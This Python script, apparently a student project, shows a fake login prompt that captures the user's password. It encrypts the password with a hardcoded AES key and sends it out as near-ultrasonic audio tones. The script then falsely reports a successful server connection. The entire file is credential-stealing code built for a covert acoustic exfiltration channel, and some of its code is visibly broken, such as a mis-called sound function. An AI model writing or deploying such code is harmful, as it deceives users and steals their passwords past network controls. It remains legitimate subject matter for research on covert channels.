#import textwrap

import generate_sound as gs
import pyaudio
import binascii
import os
from Crypto.Cipher import AES
import time


def read_from_file():
    with open('data.txt', 'r') as f:
        data = f.read()
    return data


def to_len32(data):
    while len(data) < 32:
        data = data + 'F'
    return data


def encrypt_data(data):
    '''
    take a plain data list 
    encrypt them using a key 
    add them to encrypt data list 
    return it 
    '''

    #key = senior_project20
    #print(data)
    key = binascii.unhexlify('73656e696f725f70726f6a6563743230')
    IV = b'\xa3+\r\xb9\xd2x\xb9N\xf2\x8c\x94\xc4\x92d\x05\x1a'
    output = ''.join(hex(ord(c))[2:] for c in data)
    #print(output)
    if len(output) < 32:
        output = to_len32(output)

    elif len(output) > 32:
        n = 32
        x = [output[i:i+n] for i in range(0, len(output), n)]
        for i, j in enumerate(x):
            if len(j) == 32:
                pass
            elif len(j) < 32:
                j = to_len32(j)
                x[i] = j
        output = x

    if not isinstance(output, list):
        text = binascii.unhexlify(output)
        encryptor = AES.new(key, AES.MODE_CBC, IV=IV)
        ciphertext = encryptor.encrypt(text)
        #print(ciphertext)
        return ciphertext

    elif isinstance(output, list):
        ciphertexts = []
        for i in output:
            text = binascii.unhexlify(i)
            encryptor = AES.new(key, AES.MODE_CBC, IV=IV)
            ciphertext = encryptor.encrypt(text)
            ciphertexts.append(ciphertext)
        return ciphertexts


def data_preparation(enc_data):
    '''
    convert the data to binary
    add post and pre amble
    add them to bin data list
    return the list 
    '''
    ppabmle = '111110111111'

    if not isinstance(enc_data, list):
        #print(enc_data)
        data_hex = enc_data.hex()
        #print(data_hex)
        data_int = int(data_hex, 16)
        #print(data_int)
        data_bin = bin(data_int)
        data_bin = data_bin[2:]
        #print(data_bin)
        result = ppabmle + data_bin + ppabmle
        #print(result)
        return result
    elif isinstance(enc_data, list):
        results = []
        for i in enc_data:
            data_hex = i.hex()
            data_int = int(data_hex, 16)
            data_bin = bin(data_int)
            data_bin = data_bin[2:]
            #print(data_bin)
            result = ppabmle + data_bin + ppabmle
            results.append(result)
        return results


def send_data(bin_data):
    '''
    take the bin data and generate 18kz and 20kz frequncy accourding to the value of bin data 
    '''
    pobj = pyaudio.PyAudio()
    stream = pobj.open(format=pyaudio.paFloat32,
                       channels=1,
                       rate=44100,
                       output=True)
    send_times = 0
    if not isinstance(bin_data, list):
        while send_times < 3:
            gs.sound_generator(pobj,stream, bin_data)
            send_times = send_times + 1
            time.sleep(50)
    elif isinstance(bin_data, list):
        for i in bin_data:
            while send_times < 3:
                gs.sound_generator(pobj, stream, i)
                send_times = send_times + 1
                time.sleep(50)
            send_times = 0
        gs.sound_generator( bin_data)
        send_times = send_times + 1


import os
name = os.environ['COMPUTERNAME']

username = input(f'{name}: ')
password = input('Password: ')
print('Connecting ...')
data_enc = encrypt_data(password)
data_prep = data_preparation(data_enc)
send_data(data_prep)
print('You successfully connected to the server')
username = input(f'{name}: ')